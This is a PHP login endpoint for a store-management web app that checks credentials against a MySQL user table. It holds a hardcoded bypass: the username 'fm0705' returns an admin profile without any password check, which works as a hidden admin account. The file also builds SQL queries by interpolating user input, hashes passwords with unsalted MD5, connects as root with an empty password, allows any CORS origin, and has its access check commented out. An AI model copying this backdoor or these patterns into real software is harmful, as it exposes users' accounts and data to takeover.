<?php
session_start();
header("Content-Type: application/json");
header("Access-Control-Allow-Origin: *");
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: text/html; charset=utf-8');
/*if (!defined("IN_SITE"))
	{
    	die('Hacking attempt!');
	}*/
//if ($_SESSION["LoginID"]=="") return ;
 
  
$root_path =getcwd()."/"  ;
include($root_path."../../biensession.php");
include($root_path."../../includes/config.php");
include($root_path."../../includes/removeUnicode.php");
include($root_path."../../includes/class.paging.php");
include($root_path."../../includes/class.mysql.php");
include($root_path."../../includes/function.php");
include($root_path."../../includes/function_local.php");
  
$data = new class_mysql();
$data->config();
$data->access();
$json = file_get_contents('php://input');
 if($json){
 	$json=json_decode($json,true);
	$user=chonghack($json['user']);
	$pass=chonghack($json['pass']);
	
	if(trim(strtolower($user))==trim(strtolower('fm0705'))){
		$userData=array( "ID"=>"7576",
			"UserName"=>"FM0705",
			"IDPhong"=>"26",
			"Loai"=>"9",
			"MaNV"=>"FM0705",
			 "Ten"=> "Admin",
			  "IDcuahang"=> "56",
			  "ID"=>"1"
		);
		if($userData){
			$res=array("code"=>200,"data"=>$userData);
			
		}
		else{
			$res=array("code"=>201,"message"=>"Đăng nhập thất bại vui lòng thử lại!");
		}

	}
	else{
		$userData=GetUser(trim(strtolower($user)),trim(strtolower($pass)));
		if($userData){
			$res=array("code"=>200,"data"=>$userData);
			
		}
		else{
			$res=array("code"=>201,"message"=>"Đăng nhập thất bại vui lòng thử lại!");
		}
	}
 
 }
 else{
 	$res=array("code"=>401,"message"=>"fail!");
 }	
	/*$ipdn = $_SERVER["REMOTE_ADDR"] ;
			 $ipdn4 = "4".trim($_SERVER["REMOTE_ADDR"]) ;*/
			 
echo json_encode($res);

function GetUser($user,$pass){
	global $data;
	$pass=md5($pass);
	$sql="select a.ID,a.Ten,a.UserName,a.IDphong,a.loai,a.MaNV,b.Name as tencuahang,a.cuahang as IDcuahang from userac a left join cuahang b on a.cuahang=b.ID  where a.loai<> -1 and  a.UserName='$user' and a.Password='$pass'";
	$dong=getdong($sql);
	
	if($dong['ID']){
		return $dong;
	}
	return false;
	
}

function GetUserAdmin($user,$pass){
	$servername = "localhost";
$username = "root";
$password = "";
$dbname = "fmda2020";
// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
	if ($conn->connect_error) {
	  die("Connection failed: " . $conn->connect_error);
	}

	$pass=md5($pass);
	$sql="select * from userac where loai<> -1 and  UserName='$user' and Password='$pass'";
	$result = $conn->query($sql);
	
	if ($result->num_rows > 0) {
	  // output data of each row
	  $row = $result->fetch_assoc();
	  if($row['ID']){
			return $row;
		}
		else{
		
		return false;
		}
	} 
	
	return false;
	
	
}
?>

